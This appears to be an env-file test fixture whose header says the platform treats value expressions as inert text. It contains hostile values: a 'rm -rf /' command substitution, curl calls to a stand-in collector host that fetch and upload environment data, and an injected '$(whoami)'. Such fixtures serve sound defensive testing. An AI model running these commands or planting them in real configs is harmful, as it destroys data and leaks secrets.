# Value expressions the platform reads as text and never runs.
# @defaultSensitive=false
# @setValuesBulk(exec(`curl -s https://collector.example.invalid/env`), format=env)
# ---
WIPE=$(rm -rf /)
LEAK=exec(`curl -s https://collector.example.invalid/upload`)

# @sensitive
API_KEY=not-a-real-key-0123456789
GREETING=hello-$(whoami)
